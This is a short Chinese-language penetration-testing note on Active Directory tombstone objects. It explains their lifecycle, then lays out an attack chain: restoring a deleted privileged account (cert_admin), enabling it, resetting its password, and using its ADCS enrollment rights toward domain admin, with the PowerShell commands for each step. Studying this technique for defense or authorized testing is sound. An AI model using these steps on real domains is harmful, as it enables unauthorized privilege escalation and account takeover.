# TombStone

## TombStone是什么？

### 1）墓牌（TombStone）：AD中已删除对象的一种“半死”状态

（1）当你删除一个AD对象（如用户、组、计算机）时，它不会立即永久消失，而是标记为墓牌（TombStone Object）

（2）TombStone Object移动到CN=Deleted Objects容器（隐藏容器），添加OADEL:GUID*（如cert_admin*\ODADEL:xxxx)

（3）保留大部分属性：SID（安全标识符）、组成员、权限（ACL，如Enrollment），ObjectGuid等关键信息

### 2）生命周期

（1）TombeStone LifeTime：默认180天（可配置），期间墓牌在域控制器间复制，用于垃圾回收

（2）过期后永久删除（Garbage Collection）

（3）如果启用AD Recycle Bin（Windwos Server 2008 R2+功能），墓牌进入“回收状态”，可完全恢复（包括所有属性）

## 墓牌在渗透中的作用

### 1）攻击价值

管理员删除高权限在账号（如cert_admin）以为安全，但墓牌保留属性。

（1）用Restore-ADObject（墓牌复活，Tombstone Reanimation）恢复对象->复活隐藏权限

（2）常见链：低权限用户控制原OU->恢复墓牌->恢复高权限（ADCS Enrollment）->触发ESC漏洞->域管

### 2）枚举命令

```
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

权限要求：需要Reanimate + Tombstone扩展权限+对原OU的owner权限（Full Control on ADCS）

### 3）恢复命令

```
第一种使用DistinguishedName
Restore-ADObject -Identity "<DistinguishedName>"

第二种使用ObjectGUID
Restore-ADObject -Identity "<ObjectGUID>"
```

```
# 启用账号
Enable-ADAccount -Identity "cert_admin"

# 重置密码
Set-ADAccountPassword -Identity "cert_admin" -NewPassword (ConvertTo-SecureString "aA12345677.." -AsPlainText -Force)

# 验证
Get-ADUser "cert_admin" -Properties *
```

### 4)查看屬性

```
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```

